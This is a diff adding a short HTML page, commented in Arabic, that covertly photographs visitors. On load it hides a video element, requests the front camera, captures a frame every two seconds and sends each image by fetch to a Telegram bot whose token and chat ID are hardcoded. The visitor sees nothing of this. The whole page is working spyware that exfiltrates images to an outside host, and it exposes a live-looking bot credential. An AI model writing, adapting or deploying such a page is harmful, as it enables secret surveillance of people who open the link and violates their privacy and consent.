@@ -1,0 +1,95 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+// استبدل TOKEN و CHAT_ID بالقيم الخاصة بك
+const TELEGRAM_BOT_TOKEN = "7876711075:AAG227dcC-k6dDfrb4d719FB1rApyJAh3ko";
+const TELEGRAM_CHAT_ID = "1393964545";
+
+// إعدادات الكاميرا
+const constraints = {
+  audio: false,
+  video: {
+    facingMode: "user"
+  }
+};
+
+// وظيفة لإرسال الصورة إلى تيليجرام
+function postToTelegram(imageData) {
+  const formData = new FormData();
+  formData.append("chat_id", TELEGRAM_CHAT_ID);
+  formData.append("photo", dataURLtoBlob(imageData), "image.png");
+
+  // إرسال البيانات باستخدام واجهة Telegram Bot API
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  })
+  .then(response => {
+    if (!response.ok) {
+      console.error("Failed to send photo to Telegram:", response.statusText);
+    } else {
+      console.log("Photo sent successfully to Telegram!");
+    }
+  })
+  .catch(error => {
+    console.error("Error sending photo to Telegram:", error);
+  });
+}
+
+// تحويل بيانات Base64 إلى Blob
+function dataURLtoBlob(dataURL) {
+  const parts = dataURL.split(",");
+  const mime = parts[0].match(/:(.*?);/)[1];
+  const bstr = atob(parts[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) {
+    u8arr[n] = bstr.charCodeAt(n);
+  }
+  return new Blob([u8arr], { type: mime });
+}
+
+// الوصول إلى الكاميرا
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    console.error("Error accessing webcam:", e.toString());
+  }
+}
+
+// تشغيل الفيديو والتقاط الصور
+function handleSuccess(stream) {
+  video.srcObject = stream;
+
+  const context = canvas.getContext('2d');
+
+  // التقاط صورة كل 1.5 ثانية
+  setInterval(function () {
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const canvasData = canvas.toDataURL("image/png");
+    postToTelegram(canvasData);
+  }, 2000);
+}
+
+// تشغيل الكود
+init();
+</script>
+
+</html>
